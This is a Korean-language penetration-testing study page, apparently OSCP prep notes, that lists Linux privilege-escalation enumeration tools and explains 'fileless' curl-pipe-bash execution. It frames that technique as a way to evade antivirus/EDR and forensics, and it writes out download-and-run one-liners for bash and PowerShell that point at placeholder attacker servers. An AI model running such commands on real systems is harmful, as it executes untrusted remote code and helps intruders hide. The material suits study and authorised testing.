---
layout: page
title: Linux_Automated_Enum
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

# Linux 자동화 정보 수집 및 스텔스 실행 가이드

Linux 권한 상승의 첫 단계는 시스템의 설정 오류나 취약점을 찾는 것입니다. 자동화된 정보 수집 스크립트는 이 과정을 대폭 단축시켜주며, 시스템의 전반적인 보안 상태를 빠르게 파악하는 데 매우 유용합니다.

이 문서는 주요 자동화 도구와 함께, 공격 흔적을 최소화하는 고급 실행 기법을 소개합니다.

https://0xy37.medium.com/linux-pe-cheatsheet-oscp-prep-9affaebd0f0e

---

### **1. 주요 자동화 정보 수집 도구**

다음은 Linux 권한 상승 벡터를 찾는 데 가장 널리 사용되는 스크립트들입니다.

- **LinPEAS (Linux Privilege Escalation Awesome Script)**
  - **[GitHub 링크](https://github.com/peass-ng/PEASS-ng)**
  - **설명:** 가장 유명하고 강력한 도구 중 하나입니다. 시스템의 거의 모든 정보를 다채로운 색상으로 구분하여 출력해주므로, 취약점을 한눈에 파악하기 좋습니다. SUID 파일, Cron 작업, 열린 포트, 버전 정보 등 방대한 정보를 수집합니다.

- **LinEnum**
  - **[GitHub 링크](https://github.com/rebootuser/LinEnum)**
  - **설명:** 오래전부터 사용되어 온 신뢰성 있는 스크립트입니다. 시스템 정보, 사용자 정보, 커널 및 서비스 버전 등을 체계적으로 스캔하고 보고서를 생성합니다.

- **LSE (Linux Smart Enumeration)**
  - **[GitHub 링크](https://github.com/diego-treitos/linux-smart-enumeration)**
  - **설명:** 수집된 정보의 중요도에 따라 색상을 다르게 표시하여, 권한 상승과 직결될 가능성이 높은 항목을 쉽게 식별할 수 있도록 도와줍니다.

- **LES (Linux Exploit Suggester)**
  - **[GitHub 링크](https://github.com/The-Z-Labs/linux-exploit-suggester)**
  - **설명:** 시스템의 커널 버전을 기반으로, 공개적으로 알려진 커널 익스플로잇(Exploit) 목록과 그 가능성을 제시해주는 데 특화된 도구입니다.

---

### **2. 파일리스 인메모리 실행 (Fileless In-Memory Execution)**

보안이 강화된 시스템에서는 디스크에 파일을 생성하는 행위 자체가 탐지될 수 있습니다. **인메모리 실행**은 스크립트를 디스크에 저장하지 않고, 네트워크를 통해 직접 메모리로 로드하여 실행하는 고급 스텔스 기법입니다.

#### **`curl | bash`: 공격 흔적 최소화 기법**

- **사용 목적:**
  - **탐지 회피:** 백신(AV)이나 EDR의 파일 기반 정적 분석을 우회합니다.
  - **흔적 최소화:** 시스템에 공격 스크립트 파일(Artifact)을 남기지 않아 포렌식 분석을 어렵게 만듭니다.

- **동작 원리:**
  1. **`curl [URL]`**: 지정된 URL에서 스크립트의 **내용**을 다운로드하여 **표준 출력(stdout)**으로 화면에 내보냅니다.
  2. **`|` (파이프)**: `curl`의 표준 출력을 가로채서, 다음에 오는 `bash` 명령어의 **표준 입력(stdin)**으로 직접 전달합니다.
  3. **`bash`**: 파일이 아닌 표준 입력으로부터 스크립트 내용을 읽어, 메모리상에서 한 줄씩 즉시 실행합니다.

#### **실행 예시**

```bash
# hello.sh 내용
echo "Hello! This script was executed directly from memory."
```

```bash
# 공격자 머신(Kali)에 hello.sh를 위치시킨 후, 웹 서버를 실행
python3 -m http.server 80
```

```bash
# 타겟 시스템에서 curl을 이용해 스크립트를 다운로드하고, 그 내용을 파이프로 bash에 전달하여 바로 실행
curl -s http://<attacker_ip>/hello.sh | bash
```

#### **WinPEAS / LinPEAS 실행 예시**

실제 침투 테스트 상황에서는 권한 상승 정보 수집 스크립트인 `LinPEAS`(리눅스용)나 `WinPEAS`(윈도우용)를 실행할 때 이 기법이 널리 사용됩니다.

```bash
# 공격자의 웹 서버에서 LinPEAS 스크립트를 받아 바로 실행
curl -s http://attacker-server.com/linpeas.sh | bash
```


```powershell
# PowerShell을 이용해 원격 스크립트를 다운로드하고 메모리에서 실행
# 윈도우에서는 bash 대신 PowerShell의 IEX (Invoke-Expression)를 사용하는 것이 일반적입니다. 원리는 동일합니다.
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker-server.com/winpeas.ps1')"
```

이 명령어는 `Net.WebClient` 객체를 사용해 원격 스크립트의 내용을 문자열로 다운로드한 후, `IEX`를 통해 해당 문자열을 PowerShell 코드로 즉시 실행합니다.

